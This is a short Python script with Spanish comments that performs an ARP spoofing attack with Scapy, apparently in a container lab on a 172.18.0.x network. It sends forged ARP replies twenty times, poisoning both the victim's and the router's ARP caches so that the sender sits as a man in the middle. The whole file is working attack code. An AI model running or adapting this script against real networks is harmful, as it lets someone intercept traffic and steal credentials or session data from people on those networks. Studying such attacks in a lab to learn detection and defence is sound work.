#!/usr/bin/env python3
"""Script de ataque ARP Spoofing usando Scapy."""
import time
from scapy.all import ARP, Ether, sendp

VICTIMA_IP = "172.18.0.2"
ROUTER_IP = "172.18.0.5"

# MACs de los contenedores (las que detectó bettercap antes)
VICTIMA_MAC = "d6:78:2c:d8:ea:c8"
ROUTER_MAC = "4a:c9:2e:2d:f1:a5"

print(f"[*] IP victima: {VICTIMA_IP} -> MAC: {VICTIMA_MAC}")
print(f"[*] IP router:  {ROUTER_IP} -> MAC: {ROUTER_MAC}")
print(f"[*] Enviando paquetes ARP falsos...")

for i in range(20):
    # Decir a la víctima que nosotros somos el router
    pkt_victima = ARP(op=2, psrc=ROUTER_IP, hwsrc=Ether().src,
                      pdst=VICTIMA_IP, hwdst=VICTIMA_MAC)
    # Decir al router que nosotros somos la víctima
    pkt_router = ARP(op=2, psrc=VICTIMA_IP, hwsrc=Ether().src,
                     pdst=ROUTER_IP, hwdst=ROUTER_MAC)

    sendp(pkt_victima, verbose=0)
    sendp(pkt_router, verbose=0)
    print(f"  [{i+1}/20] ARP Spoof enviado")
    time.sleep(0.5)

print("[*] Ataque finalizado.")
